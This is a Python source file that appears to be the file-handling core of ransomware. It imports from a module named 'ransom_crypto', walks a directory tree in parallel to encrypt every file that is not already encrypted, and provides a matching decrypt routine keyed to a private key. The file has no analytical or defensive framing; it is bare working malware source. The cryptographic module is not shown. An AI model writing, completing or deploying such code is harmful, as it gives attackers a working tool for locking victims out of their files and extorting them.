import os
from concurrent.futures import ThreadPoolExecutor

from global_state import Global
from ransom_crypto import EXT, decrypt_file, encrypt_file, is_encrypted


def _walk_files(root: str, only_ext: str = None) -> list:
    files = []
    stack = [root]
    while stack:
        current = stack.pop()
        try:
            with os.scandir(current) as it:
                for entry in it:
                    try:
                        if entry.is_dir(follow_symlinks=False):
                            stack.append(entry.path)
                        elif entry.is_file(follow_symlinks=False):
                            name = entry.name
                            if only_ext is None:
                                if (name.endswith(EXT)
                                        or name.endswith(EXT + ".part")
                                        or is_encrypted(entry.path)):
                                    continue
                                files.append(entry.path)
                            elif name.endswith(only_ext):
                                files.append(entry.path)
                    except OSError:
                        continue
        except OSError:
            continue
    return files


def encrypt_tree(root: str, max_workers: int = None) -> tuple:
    if not os.path.isdir(root):
        os.makedirs(root, exist_ok=True)
        return (0, 0)

    files = _walk_files(root)
    workers = max_workers or min(8, (os.cpu_count() or 2) * 2)
    done_bytes = 0
    done_files = 0
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for ok, size in pool.map(_safe_encrypt, files):
            done_files += 1 if ok else 0
            done_bytes += size
    return (done_files, done_bytes)


def decrypt_tree(root: str, private_key, progress=None, max_workers: int = None) -> tuple:
    files = _walk_files(root, only_ext=EXT)
    total_bytes = 0
    for p in files:
        try:
            total_bytes += os.path.getsize(p)
        except OSError:
            pass
    total_files = len(files)
    workers = max_workers or min(8, (os.cpu_count() or 2) * 2)
    done_bytes = 0
    done_files = 0
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for ok, size in pool.map(lambda p: _safe_decrypt(p, private_key), files):
            done_files += 1 if ok else 0
            done_bytes += size
            if progress:
                try:
                    progress(done_bytes, total_bytes, done_files, total_files)
                except Exception:
                    pass
    return (done_files, done_bytes)


def _safe_encrypt(path: str) -> tuple:
    try:
        return (True, encrypt_file(path))
    except Exception:
        return (False, 0)


def _safe_decrypt(path: str, private_key) -> tuple:
    try:
        return (True, decrypt_file(path, private_key))
    except Exception:
        return (False, 0)
